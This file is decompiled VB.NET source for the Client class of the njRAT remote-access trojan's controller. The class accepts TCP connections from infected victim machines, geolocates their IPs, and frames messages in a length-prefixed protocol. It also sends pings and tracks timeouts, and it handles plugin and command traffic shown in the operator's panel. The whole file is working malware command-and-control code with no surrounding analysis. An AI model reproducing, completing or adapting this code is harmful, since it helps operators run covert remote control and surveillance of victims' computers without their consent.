Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.njRAT

Namespace NJRAT.NJRAT
	' Token: 0x02000049 RID: 73
	Public Class Client
		' Token: 0x0600073C RID: 1852 RVA: 0x0003EDC4 File Offset: 0x0003CFC4
		Public Sub New(c As TcpClient, sk As SK)
			Me.bool_0 = False
			Me.CN = True
			Me.CName = "Unknown"
			Me.Co = "--"
			Me.int_0 = 5
			Me.Isend = False
			Me.isPL = False
			Me.IsPNGED = False
			Me.lastAC = String.Empty
			Me.lastPC = Nothing
			Me.lastPing = DateTime.Now
			Me.msec = 0L
			Me.NoPing = False
			Me.plg = New List(Of String)()
			Me.string_0 = String.Empty
			Me.t = AddressOf Me.lam__6
			Me.M = New MemoryStream()
			Me.b = New Byte(0) {}
			Me.string_1 = String.Empty
			Me.Length = -1L
			Me.osk = Nothing
			Me.bool_1 = False
			Me.Client = c
			Me.SK = sk
			Try
				Dim gclass As GClass4 = Class7.gclass3_0.method_4(c.Client.RemoteEndPoint.ToString().Split(New Char() { ":"c })(0))
				Me.Co = gclass.method_0()
				Me.CName = gclass.method_1()
				If Operators.CompareString(Me.Co, "A1", False) = 0 Or Operators.CompareString(Me.Co, "A2", False) = 0 Then
					Me.Co = "--"
				End If
				If Not Class7.form1_0.IMG2.Images.ContainsKey(Me.Co + ".png") Then
					Me.Co = "--"
				End If
				Me.COI = CType(Class7.form1_0.IMG2.Images(Me.Co + ".png"), Bitmap)
			Catch ex As Exception
			End Try
			Me.Client.Client.BeginReceive(Me.b, 0, Me.b.Length, SocketFlags.None, AddressOf Me.b_read, Nothing)
		End Sub

		' Token: 0x0600073D RID: 1853 RVA: 0x00003BB3 File Offset: 0x00001DB3
		<DebuggerStepThrough()>
		<CompilerGenerated()>
		Private Sub lam__5(object_0 As Object)
			Me.SEND_(CType(object_0, Byte()))
		End Sub

		' Token: 0x0600073E RID: 1854 RVA: 0x00003BC1 File Offset: 0x00001DC1
		<DebuggerStepThrough()>
		<CompilerGenerated()>
		Private Sub lam__6(object_0 As Object)
			Me.method_0()
		End Sub

		' Token: 0x0600073F RID: 1855 RVA: 0x0003F00C File Offset: 0x0003D20C
		Public Sub b_read(ar As IAsyncResult)
			If Not(Not Me.CN Or Me.bool_1) Then
				Try
					Dim num As Integer = 0
					Try
						num = Me.Client.Client.EndReceive(ar)
					Catch ex As SocketException
						Dim ex2 As SocketException = ex
						Me.string_1 = ex2.SocketErrorCode.ToString()
						GoTo IL_3C6
					End Try
					If num <= 0 Then
						GoTo IL_3C6
					End If
					Class7.long_1 += CLng(num)
					If Me.Length = -1L Then
						If Me.b(0) = 0 Then
							Dim array As Byte() = Me.M.ToArray()
							Me.Length = Conversions.ToLong(Class6.smethod_12(array))
							Me.M.Dispose()
							Me.M = New MemoryStream()
							If Me.Length = 0L Then
								Me.Length = -1L
								If Me.L Is Nothing And Not Me.isPL Then
									Me.string_1 = "LTimeOut"
									GoTo IL_3C6
								End If
								Dim num2 As Integer = CInt(Math.Round(Math.Round((DateAndTime.Now.Subtract(Me.lastPing).TotalMilliseconds - 10.0) / 1.5)))
								If num2 < 0 Then
									num2 = 0
								End If
								If num2 > 999 Then
									num2 = 999
								End If
								Me.lastPing = DateAndTime.Now
								Me.IsPNGED = False
								Dim text As String = "P" + Class7.string_1 + num2.ToString("000")
								Dim gclass As GClass12 = New GClass12(Me, Class6.smethod_11(text))
								Dim req As List(Of GClass12) = Me.SK.REQ
								Dim obj As List(Of GClass12) = req
								SyncLock obj
									Me.SK.REQ.Add(gclass)
									GoTo IL_1F1
								End SyncLock
								IL_1EB:
								Thread.Sleep(1)
								IL_1F1:
								If gclass.bool_0 Then
									GoTo IL_353
								End If
								GoTo IL_1EB
							Else
								Me.b = New Byte(CInt((Me.Length - 1L)) + 1 - 1 + 1 - 1) {}
							End If
						Else
							Me.M.WriteByte(Me.b(0))
						End If
					Else
						Me.M.Write(Me.b, 0, num)
						If Me.M.Length = Me.Length Then
							Me.Length = -1L
							Dim gclass2 As GClass12 = New GClass12(Me, Me.M.ToArray())
							Dim req2 As List(Of GClass12) = Me.SK.REQ
							Dim obj2 As List(Of GClass12) = req2
							SyncLock obj2
								Me.SK.REQ.Add(gclass2)
								GoTo IL_2C7
							End SyncLock
							IL_2C1:
							Thread.Sleep(1)
							IL_2C7:
							If Not gclass2.bool_0 Then
								GoTo IL_2C1
							End If
							Me.M.Dispose()
							Me.M = New MemoryStream()
							Me.b = New Byte(0) {}
						Else
							Me.b = New Byte(CInt((Me.Length - Me.M.Length - 1L)) + 1 - 1 + 1 - 1) {}
						End If
					End If
					Thread.Sleep(1)
				Catch ex3 As Exception
					Me.string_1 = "RError"
					GoTo IL_3C6
				End Try
				IL_353:
				If Not Me.CN Then
					Return
				End If
				Try
					Me.Client.Client.BeginReceive(Me.b, 0, Me.b.Length, SocketFlags.None, AddressOf Me.b_read, Nothing)
					Return
				Catch ex4 As SocketException
					Dim ex5 As SocketException = ex4
					Me.string_1 = ex5.SocketErrorCode.ToString()
				End Try
			End If
			IL_3C6:
			Me.CN = False
		End Sub

		' Token: 0x06000740 RID: 1856 RVA: 0x0003F464 File Offset: 0x0003D664
		Public Sub Close()
			If Not Me.bool_1 Then
				Me.bool_1 = True
				Me.CN = False
				Try
					Me.t.Dispose()
				Catch ex As Exception
				End Try
				Try
					Me.M.Dispose()
				Catch ex2 As Exception
				End Try
				Try
					If Me.Client.Connected Then
						Me.Client.GetStream().Close()
					End If
				Catch ex3 As Exception
				End Try
				Try
					Me.Client.Client.Close()
				Catch ex4 As Exception
				End Try
				Me.Isend = False
				Me.plg.Clear()
				If Operators.CompareString(Me.string_1, String.Empty, False) = 0 Then
					Me.string_1 = "Disconnected"
				End If
				If Me.L IsNot Nothing And Not Me.isPL Then
					If Class7.class8_0.bool_1 Then
						Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), Color.DarkSlateBlue, Me.COI, Me.ip(), Color.IndianRed, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.L)))), Color.DarkRed, Me.string_1 })
					End If
				ElseIf Class7.class8_0.bool_2 Then
					Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), Me.COI, Color.Red, Me.ip(), Color.IndianRed, Me.string_1 })
				End If
				Dim online As Collection = Class7.sk_0.Online
				Dim obj As Collection = online
				SyncLock obj
					If Class7.sk_0.Online.Contains(Me.ip()) Then
						Class7.sk_0.Online.Remove(Me.ip())
					End If
				End SyncLock
				If Me.L IsNot Nothing Then
					Class7.form1_0.L1.method_9(Me.L)
				End If
				Me.L = Nothing
			End If
		End Sub

		' Token: 0x06000741 RID: 1857 RVA: 0x0003F768 File Offset: 0x0003D968
		Public Function ip() As String
			If Me.string_0.Length <= 0 Then
				Try
					Me.string_0 = Me.Client.Client.RemoteEndPoint.ToString()
				Catch ex As Exception
					Me.string_0 = Me.GetHashCode().ToString()
				End Try
			End If
			Return Me.string_0
		End Function

		' Token: 0x06000742 RID: 1858 RVA: 0x0003F7EC File Offset: 0x0003D9EC
		Private Sub method_0()
			If Not(Me.bool_0 Or Me.bool_1) Then
				SyncLock Me
					Me.bool_0 = True
					If Not Me.CN Then
						Me.Close()
					Else
						Dim totalSeconds As Double = DateAndTime.Now.Subtract(Me.lastPing).TotalSeconds
						If Not Me.isPL AndAlso (Me.L Is Nothing And totalSeconds > 8.0) Then
							Me.string_1 = "LTimeOut"
							Me.Close()
						Else
							If Not Me.NoPing Then
								If Not Me.IsPNGED Then
									If totalSeconds >= CDbl(Me.int_0) Then
										Me.int_0 = 15
										Dim empty As String = String.Empty
										Me.SEND_(Class6.smethod_11(empty))
										Me.IsPNGED = True
										Me.lastPing = DateAndTime.Now
										If Not Me.CN Then
											Me.Close()
											GoTo IL_1DE
										End If
									End If
								ElseIf Me.SendingProgress = 0 And Not Me.isPL And totalSeconds > 6.0 And Me.L IsNot Nothing Then
									Try
										If Me.L.Cells.Count > Class7.int_10 Then
											Me.L.Cells(Class7.int_10).Value = "TimeOut"
											Me.L.Cells(Class7.int_10).Style.ForeColor = Color.Red
											Me.SEND_(New Byte(1024) {})
											If Not Me.CN Then
												Me.Close()
												GoTo IL_1DE
											End If
										End If
									Catch ex As Exception
										Me.Close()
										GoTo IL_1DE
									End Try
								End If
							End If
							Me.bool_0 = False
						End If
					End If
					IL_1DE:
				End SyncLock
			End If
		End Sub

		' Token: 0x06000743 RID: 1859 RVA: 0x0003FA18 File Offset: 0x0003DC18
		Public Function rp() As Integer
			Dim result As Integer
			If Me.Length = -1L Then
				result = 0
			Else
				Dim num As Integer
				Try
					num = Class6.smethod_1(CInt(Me.M.Length), CInt(Me.Length))
				Catch ex As Exception
					num = 0
				End Try
				result = num
			End If
			Return result
		End Function

		' Token: 0x06000744 RID: 1860 RVA: 0x0003FA88 File Offset: 0x0003DC88
		Public Function Send(S As String) As Boolean
			Me.Send(Class6.smethod_11(S))
			Return False
		End Function

		' Token: 0x06000745 RID: 1861 RVA: 0x0003FAA4 File Offset: 0x0003DCA4
		Public Sub Send(b As Byte())
			If Me.CN Then
				ThreadPool.QueueUserWorkItem(AddressOf Me.lam__5, b)
			End If
		End Sub

		' Token: 0x06000746 RID: 1862 RVA: 0x0003FAD0 File Offset: 0x0003DCD0
		Public Sub SEND_(b As Byte())
			Try
				SyncLock Me
					Me.SendingProgress = 0
					Dim array As String() = Nothing
					If b.Length > 3 Then
						array = New String() { Conversions.ToString(Strings.ChrW(CInt(b(0)))) + Conversions.ToString(Strings.ChrW(CInt(b(1)))) + Conversions.ToString(Strings.ChrW(CInt(b(2)))) }
						If Not(Operators.CompareString(array(0), "inv", False) = 0 Or Operators.CompareString(array(0), "rn" + Conversions.ToString(Strings.ChrW(CInt(b(2)))), False) = 0 Or Operators.CompareString(array(0), "up" + Conversions.ToString(Strings.ChrW(CInt(b(2)))), False) = 0 Or Operators.CompareString(array(0), "ret", False) = 0 Or Operators.CompareString(array(0), "PLG", False) = 0) Then
							array = Nothing
						End If
					End If
					Dim num As Integer = 0
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = b.Length.ToString() + vbNullChar
					Dim array2 As Byte() = Class6.smethod_11(text)
					memoryStream.Write(array2, 0, array2.Length)
					memoryStream.Write(b, 0, b.Length)
					Dim i As Integer = 1
					Dim length As Long = memoryStream.Length
					memoryStream.Position = 0L
					While i >= 1
						Dim array3 As Byte() = New Byte(10240) {}
						i = memoryStream.Read(array3, 0, array3.Length)
						Me.Client.Client.Poll(-1, SelectMode.SelectWrite)
						Try
							Me.Client.Client.Send(array3, 0, i, SocketFlags.None)
						Catch ex As SocketException
							Dim ex2 As SocketException = ex
							Me.SendingProgress = 0
							Me.string_1 = ex2.SocketErrorCode.ToString()
							Me.CN = False
							Return
						End Try
						Class7.long_0 += CLng(i)
						num += i
						If Not Me.CN Or Me.bool_1 Then
							Return
						End If
						If array <> Nothing Then
							Me.SendingProgress = Class6.smethod_1(num, CInt(length))
						End If
					End While
					memoryStream.Dispose()
					Me.SendingProgress = 0
				End SyncLock
			Catch ex3 As Exception
				Me.SendingProgress = 0
				Me.string_1 = "SError"
				Me.CN = False
			End Try
		End Sub

		' Token: 0x040003A0 RID: 928
		Public b As Byte()

		' Token: 0x040003A1 RID: 929
		Private bool_0 As Boolean

		' Token: 0x040003A2 RID: 930
		Private bool_1 As Boolean

		' Token: 0x040003A3 RID: 931
		Public Client As TcpClient

		' Token: 0x040003A4 RID: 932
		Public CN As Boolean

		' Token: 0x040003A5 RID: 933
		Public CName As String

		' Token: 0x040003A6 RID: 934
		Public Co As String

		' Token: 0x040003A7 RID: 935
		Public COI As Bitmap

		' Token: 0x040003A8 RID: 936
		Public Folder As String

		' Token: 0x040003A9 RID: 937
		Private int_0 As Integer

		' Token: 0x040003AA RID: 938
		Public Isend As Boolean

		' Token: 0x040003AB RID: 939
		Public isPL As Boolean

		' Token: 0x040003AC RID: 940
		Public IsPNGED As Boolean

		' Token: 0x040003AD RID: 941
		Public L As DataGridViewRow

		' Token: 0x040003AE RID: 942
		Public lastAC As String

		' Token: 0x040003AF RID: 943
		Public lastPC As DateTime

		' Token: 0x040003B0 RID: 944
		Public lastPing As DateTime

		' Token: 0x040003B1 RID: 945
		Public Length As Long

		' Token: 0x040003B2 RID: 946
		Public M As MemoryStream

		' Token: 0x040003B3 RID: 947
		Public msec As Long

		' Token: 0x040003B4 RID: 948
		Public NoPing As Boolean

		' Token: 0x040003B5 RID: 949
		Public osk As Client

		' Token: 0x040003B6 RID: 950
		Public plg As List(Of String)

		' Token: 0x040003B7 RID: 951
		Public SendingProgress As Integer

		' Token: 0x040003B8 RID: 952
		Public SK As SK

		' Token: 0x040003B9 RID: 953
		Private string_0 As String

		' Token: 0x040003BA RID: 954
		Private string_1 As String

		' Token: 0x040003BB RID: 955
		Public t As System.Threading.Timer
	End Class
End Namespace
